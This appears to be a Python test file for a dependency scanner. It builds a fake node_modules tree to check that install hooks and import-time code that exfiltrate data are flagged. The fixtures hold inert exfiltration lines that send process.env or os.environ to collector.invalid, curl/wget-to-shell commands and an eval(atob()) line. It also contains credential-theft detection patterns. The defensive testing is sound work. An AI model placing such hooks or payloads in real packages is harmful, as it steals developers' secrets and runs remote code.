"""--deps: what a dependency runs (core.dependency_checks; analyst gap).

A --deps scan read a dependency's files with the supply-chain rules only,
and the registry's two tests of what runs did not run on them: an installed
package whose postinstall sent the environment to a server passed with an
ordinary MAJOR install-hook finding, and one whose index.js did it when
loaded passed with nothing. Now each install hook of a dependency's manifest
is followed to the files it runs and escalates to CRITICAL when one fails the
install-script test (as in the registry), and every other JavaScript or
Python file of a dependency gets the import-time test (SC-IMPORT-RISK).

The npm engine's twin is js/src/deps.js (tests/architecture/test_js_parity.py
compares the two CLIs on the tree below). Payloads are inert text: hosts are
.invalid, and nothing is executed.
"""
import json
import os
import shutil
import tempfile
import unittest

from lazaret.scanner import core

EXFIL = ("const h = require('https');\n"
         "h.request({host: 'collector.invalid', method: 'POST'}).end(JSON.stringify(process.env));\n")
EXFIL_PY = "import os, json, requests\nrequests.post('https://collector.invalid/c', data=json.dumps(dict(os.environ)))\n"


def pkg(name, **scripts):
    return json.dumps({"name": name, "version": "1.0.0", "scripts": scripts}, indent=2)


#: package -> files (inert); the tree the parity test uses too
TREE = {
    "package.json": pkg("app", postinstall="node build.js"),
    "build.js": EXFIL,                                           # first-party: its hook is not followed
    "scripts/first-party.js": EXFIL,
    # a hook that runs a file the walk does not read as source: read, scanned as JavaScript
    "node_modules/a/package.json": pkg("a", postinstall="node install.dat"),
    "node_modules/a/install.dat": EXFIL + "eval(atob('Y29uc29sZS5sb2coMSk='));\n",
    # a shell script: tested, not scanned
    "node_modules/b/package.json": pkg("b", postinstall="sh ./install.sh"),
    "node_modules/b/install.sh": "#!/bin/sh\ncurl -s -d \"$(env)\" https://collector.invalid/x\n",
    # a directory: its package.json "main"
    "node_modules/c/package.json": pkg("c", install="node lib"),
    "node_modules/c/lib/package.json": json.dumps({"main": "core.dat"}),
    "node_modules/c/lib/core.dat": EXFIL,
    # a script by its #! line; a file outside the package, inside the tree
    "node_modules/d/package.json": pkg("d", postinstall="node ./bin/setup"),
    "node_modules/d/bin/setup": "#!/usr/bin/env node\n" + EXFIL,
    "node_modules/f/package.json": pkg("f", postinstall="node ../../scripts/first-party.js"),
    # not text; beyond the walk's limits
    "node_modules/g/package.json": pkg("g", postinstall="node blob.bin"),
    "node_modules/g/blob.bin": bytes(range(256)) * 16,
    "node_modules/h/package.json": pkg("h", postinstall="cd a; " * 1001 + "node x.js"),
    # import-time code, JavaScript and Python
    "node_modules/i/package.json": json.dumps({"name": "i", "version": "1.0.0"}),
    "node_modules/i/index.js": "module.exports = 1;\n" + EXFIL,
    "node_modules/i/lib/util.py": EXFIL_PY,
    # excluded; run by two hooks (read and scanned once); text then binary
    "node_modules/j/package.json": pkg("j", postinstall="node excluded/x.js"),
    "node_modules/j/excluded/x.js": EXFIL,
    "node_modules/k/package.json": pkg("k", preinstall="node x.dat", postinstall="node x.dat && node x.dat"),
    "node_modules/k/x.dat": EXFIL,
    "node_modules/l/package.json": pkg("l", postinstall="node half.dat"),
    "node_modules/l/half.dat": b"// text\n" * 300 + bytes(range(1, 9)) * 4000,
    # binding.gyp actions are hooks too
    "node_modules/n/package.json": json.dumps({"name": "n", "version": "1.0.0"}),
    "node_modules/n/binding.gyp": "{'targets': [{'target_name': 'x', 'actions': "
                                  "[{'action_name': 'gen', 'action': ['sh', 'gen.sh']}]}]}\n",
    "node_modules/n/gen.sh": "curl -fsSL https://files.invalid/i.sh | sh\n",
    # absolute, outside the tree, missing: not followed
    "node_modules/o/package.json": pkg("o", postinstall="node /usr/lib/x.js; node ../../../outside.js; node missing.js"),
    # a preload; a suspicious hook keeps its own message; #! sh behind a node name
    "node_modules/q/package.json": pkg("q", postinstall="node --require ./pre.js main.cjs"),
    "node_modules/q/pre.js": "require('child_process').execSync('curl -s https://files.invalid/x | sh');\n",
    "node_modules/q/main.cjs": "module.exports = 1;\n",
    "node_modules/r/package.json": pkg("r", postinstall="curl -s https://files.invalid/x | sh; node x.js"),
    "node_modules/r/x.js": EXFIL,
    "node_modules/t/package.json": pkg("t", postinstall="node script"),
    "node_modules/t/script": "#!/bin/sh\nwget -qO- https://files.invalid/i.sh | bash\n",
    # import-time code next to credentials: the snippet is redacted like any other
    "node_modules/v/index.js": EXFIL + 'const token = "ghp_' + "a1B2" * 9 + '";\nconst seed = "Zq8vN3pL0wX7rT2mK9sB4hF6";\n',
    # an ordinary dependency: nothing new
    "node_modules/u/package.json": pkg("u", postinstall="node install.js"),
    "node_modules/u/install.js": "const fs = require('fs');\nfs.copyFileSync('a', 'b');\n",
}


def make_tree(files=TREE):
    root = tempfile.mkdtemp(prefix="lz-deps-")
    for rel, data in files.items():
        path = os.path.join(root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as fh:
            fh.write(data.encode("utf-8") if isinstance(data, str) else data)
    return root


def link_target(root):
    """node_modules/e runs x.js, a link to a first-party file: never followed."""
    os.makedirs(os.path.join(root, "node_modules", "e"))
    with open(os.path.join(root, "node_modules", "e", "package.json"), "w", encoding="utf-8") as fh:
        fh.write(pkg("e", postinstall="node x.js"))
    try:
        os.symlink(os.path.join(root, "build.js"), os.path.join(root, "node_modules", "e", "x.js"))
    except (OSError, NotImplementedError):
        return False
    return True


def by_file(res, rule):
    return {i["file"].replace(os.sep, "/"): i for i in res["issues"] if i["rule"] == rule}


class DependencyCheckTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.root = make_tree()
        cls.linked = link_target(cls.root)
        cls.res = core.scan_project(cls.root, exclude=["excluded"], include_deps=True)

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.root, ignore_errors=True)

    def test_hooks_escalate_on_what_they_run(self):
        hooks = {}
        for i in self.res["issues"]:
            if i["rule"] == "SC-INSTALL-HOOK":
                hooks.setdefault(i["file"].replace(os.sep, "/"), []).append((i["sev"], i["msg"]))
        env = "reads environment variables or credential files and sends data over the network"
        want_critical = {
            "node_modules/a/package.json": f"Install hook runs install.dat, which {env}.",
            "node_modules/b/package.json": f"Install hook runs ./install.sh, which {env}.",
            "node_modules/c/package.json": f"Install hook runs lib, which {env}.",
            "node_modules/d/package.json": f"Install hook runs ./bin/setup, which {env}.",
            "node_modules/f/package.json": f"Install hook runs ../../scripts/first-party.js, which {env}.",
            "node_modules/n/binding.gyp": "Install hook runs gen.sh, which pipes a download into a shell.",
            "node_modules/q/package.json": "Install hook runs ./pre.js, which pipes a download into a shell.",
            "node_modules/r/package.json": '"postinstall" script runs a network-fetch/eval command at install time.',
            "node_modules/t/package.json": "Install hook runs script, which pipes a download into a shell.",
        }
        for manifest, msg in want_critical.items():
            with self.subTest(manifest=manifest):
                self.assertEqual(hooks[manifest], [("CRITICAL", msg)])
        self.assertEqual(hooks["node_modules/k/package.json"],
                         [("CRITICAL", f"Install hook runs x.dat, which {env}.")] * 2)
        for manifest in ("node_modules/e/package.json", "node_modules/g/package.json", "node_modules/h/package.json",
                         "node_modules/j/package.json", "node_modules/l/package.json", "node_modules/o/package.json",
                         "node_modules/u/package.json", "package.json"):
            with self.subTest(manifest=manifest):
                if manifest == "node_modules/e/package.json" and not self.linked:
                    continue
                self.assertEqual([sev for sev, _ in hooks[manifest]], ["MAJOR"])

    def test_a_file_the_walk_did_not_read_is_scanned_once(self):
        decode = by_file(self.res, "SC-EVAL-DECODE")
        self.assertIn("node_modules/a/install.dat", decode)
        rules = [i["rule"] for i in self.res["issues"] if i["file"].replace(os.sep, "/") == "node_modules/k/x.dat"]
        self.assertEqual(rules, [])                               # read once, no rule of the dependency set fires
        self.assertEqual(self.res["perFile"].get(os.path.join("node_modules", "a", "install.dat")), 1)
        # the walk's 8 (d/bin/setup, i/index.js, i/lib/util.py, q/main.cjs, q/pre.js,
        # r/x.js, u/install.js, v/index.js), and 4 read here: a/install.dat,
        # c/lib/core.dat, k/x.dat, and l/half.dat (scanned as mojibake, and
        # SC-TRUNCATED, as the registry does)
        self.assertEqual(self.res["metrics"]["depFiles"], 12)

    def test_what_cannot_be_followed_is_truncated(self):
        trunc = by_file(self.res, "SC-TRUNCATED")
        self.assertEqual(sorted(trunc), ["node_modules/g/blob.bin", "node_modules/h/package.json",
                                         "node_modules/l/half.dat"])
        self.assertIn("not text", trunc["node_modules/g/blob.bin"]["msg"])
        self.assertIn("install hook is more than Lazaret follows", trunc["node_modules/h/package.json"]["msg"])
        self.assertIn("not decodable as text", trunc["node_modules/l/half.dat"]["msg"])

    def test_import_time_code(self):
        risk = by_file(self.res, "SC-IMPORT-RISK")
        self.assertEqual(sorted(risk), ["node_modules/i/index.js", "node_modules/i/lib/util.py", "node_modules/v/index.js"])
        self.assertEqual((risk["node_modules/i/index.js"]["sev"], risk["node_modules/i/index.js"]["line"],
                          risk["node_modules/i/index.js"]["msg"]),
                         ("MAJOR", 3, "Dependency code reads credentials or the whole environment and sends "
                                      "data over the network."))
        self.assertEqual(risk["node_modules/i/lib/util.py"]["line"], 2)
        snippet = "\n".join(risk["node_modules/v/index.js"]["snippet"])
        self.assertEqual(len(risk["node_modules/v/index.js"]["snippet"]), 4)
        self.assertNotIn("ghp_", snippet)
        self.assertNotIn("Zq8vN3pL0wX7rT2mK9sB4hF6", snippet)

    def test_without_deps_nothing_changes(self):
        res = core.scan_project(self.root, exclude=["excluded"])
        rules = {i["rule"] for i in res["issues"]}
        self.assertFalse(rules & {"SC-IMPORT-RISK", "SC-TRUNCATED"}, rules)
        (hook,) = [i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
        self.assertEqual((hook["file"], hook["sev"]), ("package.json", "MAJOR"))

    def test_a_stop_during_the_checks_leaves_the_scan_incomplete(self):
        calls = []
        core.scan_project(self.root, include_deps=True, should_stop=lambda: calls.append(1))
        budget = len(calls) - 1                                   # the last call is a dependency check
        calls.clear()
        res = core.scan_project(self.root, include_deps=True,
                                should_stop=lambda: calls.append(1) or ("time budget" if len(calls) > budget else None))
        self.assertTrue(res["incomplete"])
        (note,) = [i for i in res["issues"] if i["rule"] == "SC-TRUNCATED" and i["file"] == "."]
        self.assertEqual(note["msg"], "File not fully scanned: time budget: what the dependencies run was "
                                      "not checked to the end.")
        self.assertFalse(res["pass"])


class HelperTests(unittest.TestCase):
    def test_tree_join(self):
        cases = {("node_modules/a", "x.js"): "node_modules/a/x.js", ("node_modules/a", "./b/../x.js"): "node_modules/a/x.js",
                 ("node_modules/a", "../../y.js"): "y.js", ("node_modules/a", "../../../y.js"): None,
                 ("node_modules/a", "/usr/y.js"): None, ("node_modules/a", "C:/y.js"): None,
                 ("node_modules/a", "lib\\z.js"): "node_modules/a/lib/z.js", ("", "x.js"): "x.js", ("", ".."): None,
                 ("a", "."): "a", ("a", ".."): None, ("a", "b//c/"): "a/b/c"}
        for (base, target), want in cases.items():
            with self.subTest(base=base, target=target):
                self.assertEqual(core._tree_join(base, target), want)

    def test_import_risk_needles_hold_every_match(self):
        """The pre-check never hides a match: every alternative of the
        pattern needs one of the needles."""
        for text in ("JSON.stringify( process.env)", "json.dumps(dict(os.environ))", "str(os.environ)",
                     "urlencode(os.environ,", "/.ssh/id_x", "id_ecdsa", "a.git-credentials",
                     "local storage/leveldb", "LOCAL STORAGE\\leveldb"):
            with self.subTest(text=text):
                self.assertTrue(core._IMPORT_HARVEST_RE.search(text))
                self.assertTrue(any(n in text for n in core._IMPORT_HARVEST_NEEDLES))


if __name__ == "__main__":
    unittest.main()
